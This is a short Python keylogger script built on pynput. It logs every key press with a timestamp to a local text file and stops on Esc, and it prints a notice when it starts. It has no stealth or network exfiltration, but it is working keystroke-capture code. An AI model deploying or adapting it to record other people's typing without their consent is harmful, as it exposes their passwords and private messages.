# Before running, make sure the following is installed on terminal:
# 'pip install pynput'

# Importing packages
from pynput import keyboard
import time

# Logs will be written to this file
log_file = "keystroke_logger.txt"

# Flag to track whether logging is active
logging_active = True

def on_press(key):
    global logging_active
    # On key press, this function will be called
    try:
        # Trying to append key to file
        with open(log_file, "a") as file:
            if hasattr(key, 'char'):
                file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
                print(key.char, end='', flush=True)  # Print the typed character
            else:
                file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
    except Exception as e:
        # Handle exceptions
        print(f"Error: {str(e)}")

    # Check if 'Esc' key was pressed to stop logging
    if key == keyboard.Key.esc:
        logging_active = False
        return False  # Stop listener

# Ensuring that the logger works with the consent and knowledge of the user.
print("Starting keylogger. Press 'Esc' to stop logging.")
try:
    # Start listening to keys
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    # Handle manual interruption
    pass
except Exception as e:
    # Handle other potential exceptions
    print(f"Error: {str(e)}")

# Add a message to indicate that logging has stopped
if not logging_active:
    print("\nLogging stopped.")
